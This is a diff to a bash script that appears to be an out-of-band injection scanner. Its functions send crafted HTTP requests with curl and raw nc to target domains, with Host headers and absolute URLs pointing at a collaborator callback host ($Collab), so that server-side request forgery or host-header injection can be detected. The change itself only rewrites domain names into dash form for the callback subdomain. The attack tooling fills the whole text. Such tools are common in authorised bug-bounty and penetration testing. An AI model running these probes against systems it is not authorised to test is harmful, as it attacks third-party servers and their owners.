@@ -47,7 +47,7 @@ inject_host_header() {
     if [[ -z "$domain" ]]; then
       continue
     fi
-    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
+    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
     current_time=$(date +"%H:%M:%S")
     # Increment the counter
     counter=$((counter + 1))
@@ -77,7 +77,7 @@ inject_common_headers() {
       continue
     fi
     current_time=$(date +"%H:%M:%S")
-    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
+    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
     # Increment the counter
     counter=$((counter + 1))
     # Send the HTTP GET request using curl (background) with additional headers
@@ -106,12 +106,13 @@ inject_absolute_url() {
       continue
     fi
     current_time=$(date +"%H:%M:%S")
-    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
+    U_Domain=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
+    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
     # Increment the counter
     counter=$((counter + 1))
     # Send the row HTTP GET request using nc (background)
-    echo -e "GET http://a--$UD.$Collab/ HTTP/1.1\r\nHost: $UD\r\n" | nc -q 1 $UD 80  &> /dev/null &
-    echo -e "GET http://a--$UD.$Collab/ HTTP/2\r\nHost: $UD\r\n" | nc -q 1 $UD 443 &> /dev/null &
+    echo -e "GET http://a--$UD.$Collab/ HTTP/1.1\r\nHost: $U_Domain\r\n" | nc -q 1 $U_Domain 80  &> /dev/null &
+    echo -e "GET http://a--$UD.$Collab/ HTTP/2\r\nHost: $U_Domain\r\n" | nc -q 1 $U_Domain 443 &> /dev/null &
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_absolute_url.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
@@ -167,7 +168,7 @@ inject_url_parameters() {
   fi
   # Extract parameters and inject separately
   IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"
-  UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
+  UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}'| tr . -)
   # Base URL without parameters
   base_url=$(echo "$url" | grep -oP '^[^?]+')
   p=0
